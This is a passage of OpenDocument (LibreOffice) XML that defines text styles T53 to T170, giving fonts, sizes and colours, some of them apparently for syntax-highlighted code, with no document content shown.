      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="008370aa" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0085f5a8" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="008c6a51" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="008e2d6b" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="008f0b64" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00954d43" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0096f4da" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0097a4d3" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="009b0843" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000"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62" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000"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63" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000"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64" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000"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65" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000"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66" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal"/>
    </style:style>
    <style:style style:name="T67" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T68" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004bb626"/>
    </style:style>
    <style:style style:name="T69" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d7663"/>
    </style:style>
    <style:style style:name="T70" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T71" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d7663" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004eb9d6"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="004eb9d6"/>
    </style:style>
    <style:style style:name="T74" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0062a49f"/>
    </style:style>
    <style:style style:name="T75" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0062a49f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T76" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="00649883" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T77" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006d5189"/>
    </style:style>
    <style:style style:name="T78" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003239bb" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T79" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003a2c01" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T80" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="004d7663" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T81" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T82" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d7663" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T83" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="006a6ad7" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T84" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T85" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0079ae3a" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T86" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00813e98" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T87" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0085f5a8" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T88" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="007f359c" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T89" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T90" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0065baac" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T91" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T92" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832"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93" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832"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94" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832"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95" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832"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96" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6897bb" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d7663" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T97" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T98" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006a6ad7" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T99" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T100" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0065baac" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T101" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa"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102" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa"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03" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa"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04" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T105" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T106" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="007f359c" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T107" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00813e98" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T108" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0085f5a8" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T109" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T110" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T111" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T112" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007f359c" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T113" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759"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14" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759"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15" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T116" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006a6ad7" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T117" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T118" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0065baac" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T119" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0079ae3a" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T120" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00813e98" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T121" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0085f5a8" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T122" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T123" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#383a42" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T124" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#e45649" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T125" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#986801" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T126" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#50a14f" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T127" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" style:text-underline-style="none" officeooo:rsid="002b2cfd" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T128" style:family="text">
      <style:text-properties officeooo:rsid="00330b63"/>
    </style:style>
    <style:style style:name="T129" style:family="text">
      <style:text-properties officeooo:rsid="003819bf"/>
    </style:style>
    <style:style style:name="T130" style:family="text">
      <style:text-properties fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T131" style:family="text">
      <style:text-properties officeooo:rsid="003d34eb" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T132" style:family="text">
      <style:text-properties officeooo:rsid="00abd81d" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T133" style:family="text">
      <style:text-properties fo:color="#9876aa" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T134" style:family="text">
      <style:text-properties fo:color="#9876aa" officeooo:rsid="003d34eb" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T135" style:family="text">
      <style:text-properties fo:color="#9876aa" officeooo:rsid="00abd81d" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T136" style:family="text">
      <style:text-properties fo:color="#9876aa" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T137" style:family="text">
      <style:text-properties fo:color="#9876aa" style:font-name="DejaVu Sans Mono" fo:font-style="italic" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T138" style:family="text">
      <style:text-properties fo:color="#9876aa" fo:font-style="italic" officeooo:rsid="00abd81d" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T139" style:family="text">
      <style:text-properties fo:color="#9876aa" style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00b03d32" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T140" style:family="text">
      <style:text-properties fo:color="#6a8759" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T141" style:family="text">
      <style:text-properties fo:color="#6a8759" officeooo:rsid="00409c94" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T142" style:family="text">
      <style:text-properties fo:color="#6a8759" officeooo:rsid="0046416a" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T143" style:family="text">
      <style:text-properties fo:color="#6a8759" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T144" style:family="text">
      <style:text-properties fo:color="#6a8759" style:font-name="DejaVu Sans Mono" officeooo:rsid="00b289a5" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T145" style:family="text">
      <style:text-properties fo:color="#cc7832" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T146" style:family="text">
      <style:text-properties fo:color="#cc7832" officeooo:rsid="003d34eb" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T147" style:family="text">
      <style:text-properties fo:color="#cc7832" officeooo:rsid="00abd81d" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T148" style:family="text">
      <style:text-properties fo:color="#cc7832" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T149" style:family="text">
      <style:text-properties fo:color="#cc7832" style:font-name="DejaVu Sans Mono" fo:font-weight="bold" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T150" style:family="text">
      <style:text-properties fo:color="#cc7832" fo:font-weight="bold" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T151" style:family="text">
      <style:text-properties fo:color="#cc7832" fo:font-weight="bold" officeooo:rsid="00abd81d" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T152" style:family="text">
      <style:text-properties fo:color="#cc7832" style:font-name="Times New Roman" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00b12e8e" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T153" style:family="text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T154" style:family="text">
      <style:text-properties fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T155" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T156" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T157" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T158" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T159" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-style="italic" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T160" style:family="text">
      <style:text-properties fo:font-size="14pt" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T161" style:family="text">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00ce94a2" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T162" style:family="text">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d309da" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T163" style:family="text">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d4925e" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T164" style:family="text">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d53991" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T165" style:family="text">
      <style:text-properties fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T166" style:family="text">
      <style:text-properties fo:color="#888a85" fo:font-size="14pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T167" style:family="text">
      <style:text-properties fo:color="#888a85" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T168" style:family="text">
      <style:text-properties fo:color="#cc0000" fo:font-size="14pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T169" style:family="text">
      <style:text-properties fo:color="#cc0000" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T170" style:family="text">
      <style:text-properties officeooo:rsid="003ad1eb"/>
